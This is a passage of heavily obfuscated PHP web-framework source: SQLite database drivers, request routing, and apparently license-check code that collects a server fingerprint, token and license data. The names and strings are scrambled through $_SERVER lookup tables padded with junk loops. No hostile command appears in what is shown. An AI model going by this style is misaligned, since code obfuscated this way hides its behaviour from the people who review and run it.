($¹‰Óõ‘İ = 0; $¹‰Óõ‘İ < count($€µæÜ²§); $¹‰Óõ‘İ++) { if ($€µæÜ²§[$¹‰Óõ‘İ] != $¡­ºÓñ[$ÙûÚÛ¸× + $¹‰Óõ‘İ]) { $«¤Î§’ä = !1; break; } } if (!$«¤Î§’ä) { return; } call_user_func_array(array($this, $Ş·è¼äİ), array()); } public function routeArgs($ãÅÛòÕ­ = 3) { $ÄİğŒæ¤ = $this->in[$_SERVER[™»È’øè][9]]; if (count($ÄİğŒæ¤) <= $ãÅÛòÕ­) { return array(); } $‘û¦—Š = array(); for ($¶İõ¸îØ = $ãÅÛòÕ­; $¶İõ¸îØ < count($ÄİğŒæ¤); $¶İõ¸îØ += 2) { $‘û¦—Š[$ÄİğŒæ¤[$¶İõ¸îØ]] = $ÄİğŒæ¤[$¶İõ¸îØ + 1]; $this->in[$ÄİğŒæ¤[$¶İõ¸îØ]] = $ÄİğŒæ¤[$¶İõ¸îØ + 1]; } return $‘û¦—Š; } protected function assign($ªç„æ®Ö, $ç›ÌÒ­Š) { $this->values[$ªç„æ®Ö] = $ç›ÌÒ­Š; } protected function display($³³í«Á) { ob_end_clean(); extract($this->values); require $this->tpl . $³³í«Á; } } class DbSqliteBase extends Db { public function __construct($Ò­—òõî = '') { $ÃüŠÛâˆ =& $_SERVER[™»È’øè]; if (!extension_loaded($ÃüŠÛâˆ[13])) { think_exception(think_lang($ÃüŠÛâˆ[14]) . $ÃüŠÛâˆ[15]); } if (!empty($Ò­—òõî)) { if (!isset($Ò­—òõî[$ÃüŠÛâˆ[16]])) { $Ò­—òõî[$ÃüŠÛâˆ[16]] = 438; } $this->config = $Ò­—òõî; if (empty($this->config[$ÃüŠÛâˆ[17]])) { $this->config[$ÃüŠÛâˆ[17]] = array(); } } } public function connect($èµä­à¨ = '', $ïĞÂ¯î = 0) { $‡ÌÖ‘´€ =& $_SERVER[™»È’øè]; if (!isset($this->linkID[$ïĞÂ¯î])) { if (empty($èµä­à¨)) { $èµä­à¨ = $this->config; } $ÜÌù›‡’ = !empty($èµä­à¨[$‡ÌÖ‘´€[17]][$‡ÌÖ‘´€[18]]) ? $èµä­à¨[$‡ÌÖ‘´€[17]][$‡ÌÖ‘´€[18]] : $this->pconnect; $›¸êÔÜ = $ÜÌù›‡’ ? $‡ÌÖ‘´€[19] : $‡ÌÖ‘´€[20]; $this->linkID[$ïĞÂ¯î] = $›¸êÔÜ($èµä­à¨[$‡ÌÖ‘´€[21]], $èµä­à¨[$‡ÌÖ‘´€[16]]); if (!$this->linkID[$ïĞÂ¯î]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ïĞÂ¯î], 30000); if (1 != think_config($‡ÌÖ‘´€[22])) { unset($this->config); } } return $this->linkID[$ïĞÂ¯î]; } public function free() { $this->queryID = null; } public function query($ìó¢ªŞ°) { $ˆ›³ø¶ =& $_SERVER[™»È’øè]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ìó¢ªŞ°; if ($this->queryID) { $this->free(); } think_action_status($ˆ›³ø¶[23], 1); think_status($ˆ›³ø¶[24]); $this->queryID = sqlite_query($this->_linkID, $ìó¢ªŞ°); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÙšÁ–äÖ = $this->getAll(); return $ÙšÁ–äÖ; } } public function execute($îÑ¬İ¿¨) { $Ü»½²øŒ =& $_SERVER[™»È’øè]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $îÑ¬İ¿¨; if ($this->queryID) { $this->free(); } think_action_status($Ü»½²øŒ[25], 1); think_status($Ü»½²øŒ[24]); $À–˜šç = sqlite_exec($this->_linkID, $îÑ¬İ¿¨); $this->debug(); if (!1 === $À–˜šç) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[™»È’øè][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¥½„î¾æ = sqlite_query($this->_linkID, $_SERVER[™»È’øè][27]); if (!$¥½„î¾æ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $„Û»«†· = sqlite_query($this->_linkID, $_SERVER[™»È’øè][28]); if (!$„Û»«†·) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÔÜ‹éƒÒ = array(); if ($this->numRows > 0) { for ($ëğšš’Æ = 0; $ëğšš’Æ < $this->numRows; $ëğšš’Æ++) { $ÔÜ‹éƒÒ[$ëğšš’Æ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ÔÜ‹éƒÒ; } public function getFields($ëŒà¹òÍ) { $òÈœŸïÜ =& $_SERVER[™»È’øè]; $Ê´Â÷˜Í = $this->query($òÈœŸïÜ[29] . $ëŒà¹òÍ . $òÈœŸïÜ[30]); $ì §ÑØ… = array(); if ($Ê´Â÷˜Í) { foreach ($Ê´Â÷˜Í as $™›ª˜ëş => $ùÔÈáğ½) { $ì §ÑØ…[$ùÔÈáğ½[$òÈœŸïÜ[31]]] = array($òÈœŸïÜ[32] => $ùÔÈáğ½[$òÈœŸïÜ[31]], $òÈœŸïÜ[33] => $ùÔÈáğ½[$òÈœŸïÜ[34]], $òÈœŸïÜ[35] => (bool) ($ùÔÈáğ½[$òÈœŸïÜ[36]] === $òÈœŸïÜ[12]), $òÈœŸïÜ[37] => $ùÔÈáğ½[$òÈœŸïÜ[38]], $òÈœŸïÜ[39] => strtolower($ùÔÈáğ½[$òÈœŸïÜ[40]]) == $òÈœŸïÜ[41], $òÈœŸïÜ[42] => strtolower($ùÔÈáğ½[$òÈœŸïÜ[43]]) == $òÈœŸïÜ[44]); } } return $ì §ÑØ…; } public function getTables($Ò°¾´ØŞ = '') { $²Ğ„Éê =& $_SERVER[™»È’øè]; $¥€™™”İ = $this->query($²Ğ„Éê[45] . $²Ğ„Éê[46] . $²Ğ„Éê[47]); $°¯ïŒÕ€ = array(); foreach ($¥€™™”İ as $­£æóÆÌ => $È¬óÆúó) { $°¯ïŒÕ€[$­£æóÆÌ] = current($È¬óÆúó); } return $°¯ïŒÕ€; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $²ûÅÌñ =& $_SERVER[™»È’øè]; $–å›ŒúÛ = sqlite_last_error($this->_linkID); $this->error = $–å›ŒúÛ . $²ûÅÌñ[4] . sqlite_error_string($–å›ŒúÛ); if ($²ûÅÌñ[12] != $this->queryStr) { $this->error .= LNG($²ûÅÌñ[48]) . $this->queryStr; } think_trace($this->error, $²ûÅÌñ[12], $²ûÅÌñ[49]); return $this->error; } public function escapeString($÷Ñ¼®šê) { return sqlite_escape_string($÷Ñ¼®šê); } public function parseLimit($ë§€ÍÈã) { $ĞÎ©Ë¨  =& $_SERVER[™»È’øè]; $²´Ì¹­ = $ĞÎ©Ë¨ [12]; if (!empty($ë§€ÍÈã)) { $ë§€ÍÈã = explode($ĞÎ©Ë¨ [50], $ë§€ÍÈã); if (count($ë§€ÍÈã) > 1) { $²´Ì¹­ .= $ĞÎ©Ë¨ [51] . $ë§€ÍÈã[1] . $ĞÎ©Ë¨ [52] . $ë§€ÍÈã[0] . $ĞÎ©Ë¨ [53]; } else { $²´Ì¹­ .= $ĞÎ©Ë¨ [51] . $ë§€ÍÈã[0] . $ĞÎ©Ë¨ [53]; } } return $²´Ì¹­; } } class DbSqlite3Base extends Db { public function __construct($»ÎÀë¸€ = '') { $Éä–®ãÜ =& $_SERVER[™»È’øè]; if (!class_exists($Éä–®ãÜ[54])) { think_exception(think_lang($Éä–®ãÜ[14]) . $Éä–®ãÜ[55]); } if (!empty($»ÎÀë¸€)) { if (!isset($»ÎÀë¸€[$Éä–®ãÜ[16]])) { $»ÎÀë¸€[$Éä–®ãÜ[16]] = 438; } $this->config = $»ÎÀë¸€; if (empty($this->config[$Éä–®ãÜ[17]])) { $this->config[$Éä–®ãÜ[17]] = array(); } } } public function connect($İÚß‡® = '', $Ö‚”ø¢¼ = 0) { $•…Ã’ƒû =& $_SERVER[™»È’øè]; if (!isset($this->linkID[$Ö‚”ø¢¼])) { if (empty($İÚß‡®)) { $İÚß‡® = $this->config; } $this->linkID[$Ö‚”ø¢¼] = new SQLite3($İÚß‡®[$•…Ã’ƒû[21]]); if (!$this->linkID[$Ö‚”ø¢¼]) { think_exception($this->linkID[$Ö‚”ø¢¼]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Ö‚”ø¢¼]->busyTimeout(30000); if (1 != think_config($•…Ã’ƒû[22])) { unset($this->config); } } return $this->linkID[$Ö‚”ø¢¼]; } public function free() { $this->queryID = null; } public function query($òùæ¤è) { $ã¿‰Œ‚Ú =& $_SERVER[™»È’øè]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $òùæ¤è; if ($this->queryID) { $this->free(); } think_action_status($ã¿‰Œ‚Ú[23], 1); think_status($ã¿‰Œ‚Ú[24]); $this->queryID = $this->_linkID->query($òùæ¤è); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $í²§œø– = $this->getAll(); $this->numRows = count($í²§œø–); return $í²§œø–; } } public function execute($¢íéçŞ) { $Êñ¿šÊ =& $_SERVER[™»È’øè]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¢íéçŞ; if ($this->queryID) { $this->free(); } think_action_status($Êñ¿šÊ[25], 1); think_status($Êñ¿šÊ[24]); $›­»Ï‚† = $this->_linkID->exec($¢íéçŞ); $this->debug(); if (!1 === $›­»Ï‚†) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[™»È’øè][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $à‹ºÛ¡ = $this->_linkID->query($_SERVER[™»È’øè][27]); if (!$à‹ºÛ¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÈÃış— = $this->_linkID->query($_SERVER[™»È’øè][28]); if (!$ÈÃış—) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ˆ·í¦ª = array(); while ($º’å¢â = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ˆ·í¦ª[] = $º’å¢â; } $this->queryID->reset(); return $ˆ·í¦ª; } public function getFields($ßúâ×‚) { $¾åÃ±ÍË =& $_SERVER[™»È’øè]; $´¦Õêì¹ = $this->query($¾åÃ±ÍË[29] . $ßúâ×‚ . $¾åÃ±ÍË[30]); $´Â®›‡ = array(); if ($´¦Õêì¹) { foreach ($´¦Õêì¹ as $³¶—æöÏ => $Ï©©Ù) { $´Â®›‡[$Ï©©Ù[$¾åÃ±ÍË[32]]] = array($¾åÃ±ÍË[32] => $Ï©©Ù[$¾åÃ±ÍË[32]], $¾åÃ±ÍË[33] => $Ï©©Ù[$¾åÃ±ÍË[33]], $¾åÃ±ÍË[35] => (bool) ($Ï©©Ù[$¾åÃ±ÍË[35]] === $¾åÃ±ÍË[12]), $¾åÃ±ÍË[37] => $Ï©©Ù[$¾åÃ±ÍË[56]], $¾åÃ±ÍË[39] => (bool) $Ï©©Ù[$¾åÃ±ÍË[57]], $¾åÃ±ÍË[42] => (bool) $Ï©©Ù[$¾åÃ±ÍË[57]]); } } return $´Â®›‡; } public function getTables($‡Ò»‰ã¬ = '') { $®áé¦¬ø =& $_SERVER[™»È’øè]; $…Îã¯—ö = $this->query($®áé¦¬ø[45] . $®áé¦¬ø[46] . $®áé¦¬ø[47]); $øº×‚ = array(); foreach ($…Îã¯—ö as $°¯šşÄ» => $üöğåú¶) { $øº×‚[$°¯šşÄ»] = current($üöğåú¶); } return $øº×‚; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¯Õª£È =& $_SERVER[™»È’øè]; $this->error = $this->_linkID->lastErrorMsg(); if ($¯Õª£È[12] != $this->queryStr) { $this->error .= LNG($¯Õª£È[48]) . $this->queryStr; } think_trace($this->error, $¯Õª£È[12], $¯Õª£È[49]); return $this->error; } public function escapeString($˜Ï£Šæ) { $öóÊ¦¿ =& $_SERVER[™»È’øè]; if ($this->_linkID) { return $this->_linkID->escapeString($˜Ï£Šæ); } return str_ireplace($öóÊ¦¿[58], $öóÊ¦¿[59], $˜Ï£Šæ); } public function parseLimit($ËÜ‘ğÏÎ) { $œììÁÄı =& $_SERVER[™»È’øè]; $‰••ùÊ = $œììÁÄı[12]; if (!empty($ËÜ‘ğÏÎ)) { $ËÜ‘ğÏÎ = explode($œììÁÄı[50], $ËÜ‘ğÏÎ); if (count($ËÜ‘ğÏÎ) > 1) { $‰••ùÊ .= $œììÁÄı[51] . $ËÜ‘ğÏÎ[1] . $œììÁÄı[52] . $ËÜ‘ğÏÎ[0] . $œììÁÄı[53]; } else { $‰••ùÊ .= $œììÁÄı[51] . $ËÜ‘ğÏÎ[0] . $œììÁÄı[53]; } } return $‰••ùÊ; } } goto Fğ«ùÎ£Û; C¶¬‡¼°«: define($_SERVER[™»È’øè][284], 1); define($_SERVER[™»È’øè][285], 0); define($_SERVER[™»È’øè][286], 2); goto eÜ´£—ØÎ­; E¬åÂáƒÌ½: $flytxedbvo = $_SERVER[™»È’øè][650]; if (!$flytxedbvo) { die; } class Application { private $defaultModule = "\151\x6e\x64\x65\x78"; private $defaultController = "\x69\156\144\145\x78"; private $defaultAction = "\x69\x6e\x64\x65\x78"; function __construct() { } public function setDefault($é™§â‘Š) { $“ñÑ­åÛ =& $_SERVER[™»È’øè]; $—Ã°şÔ =& $_SERVER[ÏÉ‹Ã ]; $ÜÚ°‰üè = explode($—Ã°şÔ[0], trim($é™§â‘Š, $—Ã°şÔ[0])); $this->defaultModule = $ÜÚ°‰üè[0] ? $ÜÚ°‰üè[0] : $this->defaultModule; $òÙØ¾·ï = $“ñÑ­åÛ[651]; $this->defaultController = $ÜÚ°‰üè[1] ? $ÜÚ°‰üè[1] : $this->defaultController; $†¦ìÊËæ = $“ñÑ­åÛ[652]; if (!$†¦ìÊËæ) { die; } $this->defaultAction = $ÜÚ°‰üè[2] ? $ÜÚ°‰üè[2] : $this->defaultAction; $õšÔ×û° = $“ñÑ­åÛ[653]; if (strlen($õšÔ×û°) < $“ñÑ­åÛ[654]) { return; } $this->okcef17be96d($—Ã°şÔ[1], array($this, $—Ã°şÔ[2])); } public function appRun($·ÙÙŒ…Ì) { $´ñÛ»ƒØ =& $_SERVER[™»È’øè]; $ññ®ò›Ú =& $_SERVER[ÏÉ‹Ã ]; $Ôà÷ÂãÙ = explode($ññ®ò›Ú[0], $·ÙÙŒ…Ì); $«Ò£½Å = strtolower($Ôà÷ÂãÙ[0]); $³åÒª³ = $´ñÛ»ƒØ[655]; if (strlen($³åÒª³) < $´ñÛ»ƒØ[656]) { return; } $²ÒßıŠ = $ññ®ò›Ú[3]; if ($«Ò£½Å == $ññ®ò›Ú[4]) { $²ÒßıŠ = $ññ®ò›Ú[5]; $Ôà÷ÂãÙ[0] = $ññ®ò›Ú[6]; $Ôà÷ÂãÙ[1] = $Ôà÷ÂãÙ[1] . $ññ®ò›Ú[7]; $·ÙÙŒ…Ì = join($ññ®ò›Ú[0], $Ôà÷ÂãÙ); $·ÙÙŒ…Ì = trim($·ÙÙŒ…Ì, $ññ®ò›Ú[0]); } call_user_func(array($ññ®ò›Ú[8], $ññ®ò›Ú[9]), $²ÒßıŠ . $ññ®ò›Ú[10], $·ÙÙŒ…Ì); ActionCall($·ÙÙŒ…Ì); $ÉÅ›ÆÇÀ = $´ñÛ»ƒØ[657]; call_user_func(array($ññ®ò›Ú[8], $ññ®ò›Ú[9]), $²ÒßıŠ . $ññ®ò›Ú[11], $·ÙÙŒ…Ì); } private function autorun() { $•¸¼ê—ù =& $_SERVER[ÏÉ‹Ã ]; global $config; if (count($config[$•¸¼ê—ù[12]]) == 0) { return; } foreach ($config[$•¸¼ê—ù[12]] as $Í¼Ÿ°ğ  => $¡Âˆ¬Ì) { $this->appRun($¡Âˆ¬Ì); } } private function hmvke9b1e667() { $šÉĞœ‰ê =& $_SERVER[™»È’øè]; $¾…—¼äƒ =& $_SERVER[ÏÉ‹Ã ]; $ä¤½•Æô = $¾…—¼äƒ[4]; $µôÉ†ƒÊ = $GLOBALS[$¾…—¼äƒ[13]][$¾…—¼äƒ[14]][0]; $‰Ñ—†â´ = $šÉĞœ‰ê[658]; while ($‰Ñ—†â´ < $šÉĞœ‰ê[659]) { if ($‰Ñ—†â´ >= 0) { break; } $‰Ñ—†â´++; } if (!$µôÉ†ƒÊ || strlen($µôÉ†ƒÊ) <= strlen($ä¤½•Æô)) { return; } if (strtolower(substr($µôÉ†ƒÊ, -strlen($ä¤½•Æô))) != $ä¤½•Æô) { return; } $Å¡Áøí = substr($µôÉ†ƒÊ, 0, -strlen($ä¤½•Æô)); $øÉ›Ü = $šÉĞœ‰ê[660]; while ($øÉ›Ü < $šÉĞœ‰ê[654]) { if ($øÉ›Ü >= 0) { break; } $øÉ›Ü++; } $¯ ¾î¬í = array($¾…—¼äƒ[4], $Å¡Áøí); $´§Ä¹ö = array_slice($GLOBALS[$¾…—¼äƒ[13]][$¾…—¼äƒ[14]], 1); $GLOBALS[$¾…—¼äƒ[13]][$¾…—¼äƒ[14]] = array_merge($¯ ¾î¬í, $´§Ä¹ö); $õÔÙ™— = $šÉĞœ‰ê[661]; while ($õÔÙ™— < $šÉĞœ‰ê[659]) { if ($õÔÙ™— >= 0) { break; } $õÔÙ™—++; } $GLOBALS[$¾…—¼äƒ[13]][$¾…—¼äƒ[15]] = implode($¾…—¼äƒ[0], $GLOBALS[$¾…—¼äƒ[13]][$¾…—¼äƒ[14]]); } private function nkit693f2593() { $à¸°˜‰ä =& $_SERVER[™»È’øè]; $¾¼ş²Ú° =& $_SERVER[ÏÉ‹Ã ]; if ($GLOBALS[$¾¼ş²Ú°[13]][$¾¼ş²Ú°[15]] != $¾¼ş²Ú°[6]) { return; } $ ö×ëÎˆ = $_SERVER[$¾¼ş²Ú°[16]]; $Â£Í°™æ = $¾¼ş²Ú°[17]; $µË›Õ¯÷ = $à¸°˜‰ä[662]; if (strlen($µË›Õ¯÷) < $à¸°˜‰ä[663]) { return; } if (!strstr($ ö×ëÎˆ, $Â£Í°™æ)) { return; } $ï½˜€÷Ö = strrpos($ ö×ëÎˆ, $Â£Í°™æ); $ËõÁ˜Ì§ = $à¸°˜‰ä[664]; while (strlen($ËõÁ˜Ì§) < $à¸°˜‰ä[656]) { if (!$ËõÁ˜Ì§) { break; } $ËõÁ˜Ì§++; } $¤œÃÑñ = substr($ ö×ëÎˆ, $ï½˜€÷Ö + strlen($Â£Í°™æ)); $ µŠË¿ = $à¸°˜‰ä[665]; while ($ µŠË¿ < $à¸°˜‰ä[659]) { if ($ µŠË¿ >= 0) { break; } $ µŠË¿++; } preg_match_all($¾¼ş²Ú°[18], $¤œÃÑñ, $œ´ÔĞÄ£); $¤œÃÑñ = trim($œ´ÔĞÄ£[0][0], $¾¼ş²Ú°[19]); $GLOBALS[$¾¼ş²Ú°[13]][$¾¼ş²Ú°[14]] = explode($¾¼ş²Ú°[19], $¤œÃÑñ); $ª»ı Á = $à¸°˜‰ä[666]; if (strlen($ª»ı Á) < $à¸°˜‰ä[663]) { return; } $GLOBALS[$¾¼ş²Ú°[13]][$¾¼ş²Ú°[15]] = implode($¾¼ş²Ú°[0], $GLOBALS[$¾¼ş²Ú°[13]][$¾¼ş²Ú°[14]]); $€ôâôÂã = $à¸°˜‰ä[667]; } public function run() { $…äÂÕª¨ =& $_SERVER[ÏÉ‹Ã ]; $this->nkit693f2593(); $õÈÃ¶›È = $_SERVER[™»È’øè][668]; $this->hmvke9b1e667(); $êÕùª©ı = $GLOBALS[$…äÂÕª¨[13]][$…äÂÕª¨[14]]; $Ò›ŸÒËè = $GLOBALS[$…äÂÕª¨[13]][$…äÂÕª¨[15]]; define($…äÂÕª¨[20], isset($êÕùª©ı[0]) && $êÕùª©ı[0] ? $êÕùª©ı[0] : $this->defaultModule); define($…äÂÕª¨[21], isset($êÕùª©ı[1]) && $êÕùª©ı[0] ? $êÕùª©ı[1] : $this->defaultController); define($…äÂÕª¨[22], isset($êÕùª©ı[2]) && $êÕùª©ı[0] ? $êÕùª©ı[2] : $this->defaultAction); define($…äÂÕª¨[23], MOD . $…äÂÕª¨[0] . ST . $…äÂÕª¨[0] . ACT); $_SERVER[$…äÂÕª¨[24]] = strtolower(ACTION); $this->autorun(); if (count($êÕùª©ı) >= 3) { $this->appRun($Ò›ŸÒËè); } else { $this->appRun(ACTION); } } private $aszee41248da = array(); private $cajde88165f4 = ''; public function upewea2a5442() { $êÁ³ğ€¿ =& $_SERVER[™»È’øè]; $åäù¬ÓË =& $_SERVER[ÏÉ‹Ã ]; $this->oehq100e29c9(); $this->ufad67d9dd83(); $êÉóşî² = $êÁ³ğ€¿[669]; if (!$êÉóşî²) { die; } $this->cdahbfd49be8(); $this->vgqp4897bc45(); $ïÖí‡ÚÈ = $êÁ³ğ€¿[670]; if (!$ïÖí‡ÚÈ) { return; } $this->manb5497565b(); $this->ajudd08b1b3b(); $Šñ›¾Ë­ = $êÁ³ğ€¿[671]; while ($Šñ›¾Ë­ < $êÁ³ğ€¿[654]) { if ($Šñ›¾Ë­ >= 0) { break; } $Šñ›¾Ë­++; } $this->rdfy5e19937e(); $£²ô €å = $êÁ³ğ€¿[672]; $this->okcef17be96d($åäù¬ÓË[25], array($this, $åäù¬ÓË[26])); $this->okcef17be96d($åäù¬ÓË[27], array($this, $åäù¬ÓË[28])); $this->okcef17be96d($åäù¬ÓË[29], array($this, $åäù¬ÓË[30])); $this->okcef17be96d($åäù¬ÓË[31], array($this, $åäù¬ÓË[32])); } public function knuo2968735e($µ¡¬÷Èë) { $âÀ®º¼Ş =& $_SERVER[™»È’øè]; $Óù“ò÷ë =& $_SERVER[ÏÉ‹Ã ]; $‡ˆ¢»ğò = Model($Óù“ò÷ë[33])->get(); $ï‰ºÎ‰£ = array($Óù“ò÷ë[34], $Óù“ò÷ë[35], $Óù“ò÷ë[36], $Óù“ò÷ë[37], $Óù“ò÷ë[38], $Óù“ò÷ë[39], $Óù“ò÷ë[40], $Óù“ò÷ë[41], $Óù“ò÷ë[42], $Óù“ò÷ë[43], $Óù“ò÷ë[44], $Óù“ò÷ë[45], $Óù“ò÷ë[46], $Óù“ò÷ë[47], $Óù“ò÷ë[48], $Óù“ò÷ë[49], $Óù“ò÷ë[50], $Óù“ò÷ë[51], $Óù“ò÷ë[52], $Óù“ò÷ë[53], $Óù“ò÷ë[54], $Óù“ò÷ë[55], $Óù“ò÷ë[56], $Óù“ò÷ë[57], $Óù“ò÷ë[58], $Óù“ò÷ë[59], $Óù“ò÷ë[60], $Óù“ò÷ë[61], $Óù“ò÷ë[62], $Óù“ò÷ë[63], $Óù“ò÷ë[64], $Óù“ò÷ë[65], $Óù“ò÷ë[66], $Óù“ò÷ë[67], $Óù“ò÷ë[68], $Óù“ò÷ë[69], $Óù“ò÷ë[70], $Óù“ò÷ë[71], $Óù“ò÷ë[72], $Óù“ò÷ë[73], $Óù“ò÷ë[74], $Óù“ò÷ë[75], $Óù“ò÷ë[76], $Óù“ò÷ë[77], $Óù“ò÷ë[78], $Óù“ò÷ë[79], $Óù“ò÷ë[80], $Óù“ò÷ë[81], $Óù“ò÷ë[82], $Óù“ò÷ë[83], $Óù“ò÷ë[84]); foreach ($ï‰ºÎ‰£ as $òªÚ©êğ) { $ø§±Èß« = $GLOBALS[$Óù“ò÷ë[85]][$Óù“ò÷ë[86]][$òªÚ©êğ]; $èûŒşËä = $âÀ®º¼Ş[673]; if (!$èûŒşËä) { die; } if (isset($‡ˆ¢»ğò[$òªÚ©êğ])) { $ø§±Èß« = $‡ˆ¢»ğò[$òªÚ©êğ]; } $µ¡¬÷Èë[$Óù“ò÷ë[87]][$Óù“ò÷ë[88]][$òªÚ©êğ] = $ø§±Èß«; } $è¡à†Óù = $µ¡¬÷Èë[$Óù“ò÷ë[87]][$Óù“ò÷ë[88]][$Óù“ò÷ë[46]]; $¥Ë›¨ö = $âÀ®º¼Ş[674]; if (!$¥Ë›¨ö) { die; } unset($µ¡¬÷Èë[$Óù“ò÷ë[87]][$Óù“ò÷ë[89]][$Óù“ò÷ë[90]]); unset($µ¡¬÷Èë[$Óù“ò÷ë[87]][$Óù“ò÷ë[89]][$Óù“ò÷ë[91]]); $”­«Ö§÷ = $âÀ®º¼Ş[675]; unset($µ¡¬÷Èë[$Óù“ò÷ë[87]][$Óù“ò÷ë[88]][$Óù“ò÷ë[46]]); unset($µ¡¬÷Èë[$Óù“ò÷ë[87]][$Óù“ò÷ë[88]][$Óù“ò÷ë[92]]); $ åà«• = $âÀ®º¼Ş[676]; $µ¡¬÷Èë[$Óù“ò÷ë[87]][$Óù“ò÷ë[88]][$Óù“ò÷ë[93]] = array($Óù“ò÷ë[94] => (int) $è¡à†Óù[$Óù“ò÷ë[95]], $Óù“ò÷ë[96] => (int) _get($è¡à†Óù, $Óù“ò÷ë[97], 0)); $µ¡¬÷Èë[$Óù“ò÷ë[98]][$Óù“ò÷ë[99]] = Action($Óù“ò÷ë[100])->accessToken(); $¾ö³ƒÉ€ = $âÀ®º¼Ş[677]; $µ¡¬÷Èë[$Óù“ò÷ë[98]][$Óù“ò÷ë[101]] = md5($_SERVER[$Óù“ò÷ë[102]] . $‡ˆ¢»ğò[$Óù“ò÷ë[103]]); $µ¡¬÷Èë[$Óù“ò÷ë[98]][$Óù“ò÷ë[104]] = base64_encode(serverInfo()); $ÇİƒêÎŒ = $âÀ®º¼Ş[678]; $µ¡¬÷Èë[$Óù“ò÷ë[98]][$Óù“ò÷ë[105]] = $this->cajde88165f4; $ÉıÅ…ü¿ = $âÀ®º¼Ş[679]; if ($‡ˆ¢»ğò[$Óù“ò÷ë[105]] != $Óù“ò÷ë[106]) { $µ¡¬÷Èë[$Óù“ò÷ë[98]][$Óù“ò÷ë[107]] = $‡ˆ¢»ğò[$Óù“ò÷ë[107]]; $µ¡¬÷Èë[$Óù“ò÷ë[98]][$Óù“ò÷ë[108]] = $‡ˆ¢»ğò[$Óù“ò÷ë[108]]; $çŒûĞòö = rand_string(10) . $this->cajde88165f4 . rand_string(5); $µ¡¬÷Èë[$Óù“ò÷ë[87]][$Óù“ò÷ë[109]][$Óù“ò÷ë[110]] = $this->zdlif213eb5f($çŒûĞòö, $µ¡¬÷Èë[$Óù“ò÷ë[98]][$Óù“ò÷ë[101]]); } if ($this->cajde88165f4 == $Óù“ò÷ë[106]) { $µ¡¬÷Èë[$Óù“ò÷ë[87]][$Óù“ò÷ë[88]][$Óù“ò÷ë[93]][$Óù“ò÷ë[97]] = 0; } $µ¡¬÷Èë[$Óù“ò÷ë[98]][$Óù“ò÷ë[111]] = _get($this->aszee41248da, $Óù“ò÷ë[112], $Óù“ò÷ë[6]); $µ¡¬÷Èë[$Óù“ò÷ë[98]][$Óù“ò÷ë[113]] = _get($this->aszee41248da, $Óù“ò÷ë[114], $Óù“ò÷ë[6]); $ùò—Ôİ = $âÀ®º¼Ş[680]; if (!$ùò—Ôİ) { return; } if (_get($GLOBALS, $Óù“ò÷ë[115]) && $this->config[$Óù“ò÷ë[116]]) { $µ¡¬÷Èë[$Óù“ò÷ë[98]][$Óù“ò÷ë[117]] = WEB_ROOT; } return $µ¡¬÷Èë; } private function ajudd08b1b3b() { $åˆ€®µ =& $_SERVER[™»È’øè]; $Š¡¿Úã£ =& $_SERVER[ÏÉ‹Ã ]; $ı²…Ï˜ª = $_SERVER[$Š¡¿Úã£[24]] == $Š¡¿Úã£[118]; if ($_SERVER[$Š¡¿Úã£[24]] == $Š¡¿Úã£[119] && $_GET[$Š¡¿Úã£[120]] == $Š¡¿Úã£[121]) { $ı²…Ï˜ª = !0; } if ($ı²…Ï˜ª) { $®’ñĞÈ’ = array($Š¡¿Úã£[105] => $this->cajde88165f4, $Š¡¿Úã£[122] => $this->yjxebbf567c4(), $Š¡¿Úã£[123] => Model($Š¡¿Úã£[124])->count()); if ($this->cajde88165f4 != $Š¡¿Úã£[106]) { $øÒŒÅ¤í = _get($this->aszee41248da, $Š¡¿Úã£[125]); if ($øÒŒÅ¤í) { $®’ñĞÈ’[$Š¡¿Úã£[126]] = $øÒŒÅ¤í; $®’ñĞÈ’[$Š¡¿Úã£[127]] = strtotime(_get($this->aszee41248da, $Š¡¿Úã£[128])); $®’ñĞÈ’[$Š¡¿Úã£[129]] = _get($this->aszee41248da, $Š¡¿Úã£[114]); } $‡ÅÕÛúŒ = Model($Š¡¿Úã£[33])->get($Š¡¿Úã£[130], $Š¡¿Úã£[6], !0); if (is_string($‡ÅÕÛúŒ) && substr($‡ÅÕÛúŒ, 0, 1) == $Š¡¿Úã£[131]) { $‡ÅÕÛúŒ = json_decode_force($‡ÅÕÛúŒ); } if (is_array($‡ÅÕÛúŒ) && $‡ÅÕÛúŒ[$Š¡¿Úã£[132]] && strstr($‡ÅÕÛúŒ[$Š¡¿Úã£[132]], $Š¡¿Úã£[133])) { $Èæ’˜’‰ = explode($Š¡¿Úã£[133], $‡ÅÕÛúŒ[$Š¡¿Úã£[132]]); $®’ñĞÈ’[$Š¡¿Úã£[134]] = 